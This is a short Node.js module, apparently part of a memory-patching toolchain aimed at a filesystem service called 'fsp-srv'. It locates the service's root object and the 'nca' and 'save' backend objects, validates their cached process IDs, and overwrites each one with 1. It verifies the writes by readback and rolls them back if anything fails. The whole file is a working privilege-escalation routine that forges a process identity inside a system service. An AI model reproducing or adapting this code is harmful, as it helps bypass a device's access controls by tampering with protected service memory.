#!/usr/bin/env node
// Identify our fsp-srv object by ordinary clone requests, then follow its PIDs.
const check = (ok, message) => { if (!ok) throw Error(message); };
const canonical = value => value >= 0x100000000n && value < 0x8000000000n && value % 8n === 0n;

async function identityFields(memory, root) {
  const rootBytes = await memory.read(root, 0x40);
  const pid = rootBytes.readBigUInt64LE(0x30);
  check(pid > 0n && pid < 0x1000000n, 'The root has no initialized process identity');
  const fields = [{name: 'root', address: root + 0x30, before: pid.toString(),
    object: root, objectHex: rootBytes.toString('hex')}];
  for (const [name, offset, pidOffset] of [['nca', 0x10, 0x20], ['save', 0x20, 0x28]]) {
    const chain = await memory.chase(root, [offset]);
    check(BigInt(chain.address) === rootBytes.readBigUInt64LE(offset + 8) + 0x18n,
      'The ' + name + ' backend raw/control pair differs');
    const bytes = await memory.read(chain.address, 0x60);
    const cachedPid = bytes.readBigUInt64LE(pidOffset);
    check(canonical(bytes.readBigUInt64LE(0)) && (cachedPid === pid || cachedPid === 1n),
      'The ' + name + ' backend identity does not match the root');
    fields.push({name, address: chain.address + pidOffset, before: cachedPid.toString(),
      object: chain.address, objectHex: bytes.toString('hex'), chain: chain.trace});
  }
  return fields;
}

async function promote(memory, evidence, save) {
  evidence.writes = [];
  evidence.pending = true;
  await save();
  try {
    for (const field of evidence.fields) {
      if (field.before === '1') continue;
      evidence.pendingField = {name: field.name, address: field.address, expected: field.before, replacement: '1'};
      await save();
      const result = await memory.writeU64(field.address, BigInt(field.before), 1n);
      evidence.writes.push({name: field.name, address: field.address, before: field.before, result});
      delete evidence.pendingField;
      await save();
    }
    for (const field of evidence.fields) {
      const expected = Buffer.from(field.objectHex, 'hex');
      expected.writeBigUInt64LE(1n, field.address - field.object);
      check((await memory.read(field.object, expected.length)).equals(expected),
        'Fields other than the ' + field.name + ' PID changed');
    }
    evidence.pidReadbackVerified = true;
    evidence.pending = false;
    await save();
  } catch (error) {
    evidence.rollback = [];
    for (const write of [...evidence.writes].reverse()) {
      try {
        const result = await memory.writeU64(write.address, 1n, BigInt(write.before));
        evidence.rollback.push({name: write.name, restored: true, result});
      } catch (restoreError) {
        evidence.rollback.push({name: write.name, restored: false, error: restoreError.message});
        break;
      }
      await save();
    }
    evidence.pending = Boolean(evidence.pendingField) ||
      evidence.rollback.filter(row => row.restored).length !== evidence.writes.length;
    await save();
    throw error;
  }
}

module.exports = {identityFields, promote};
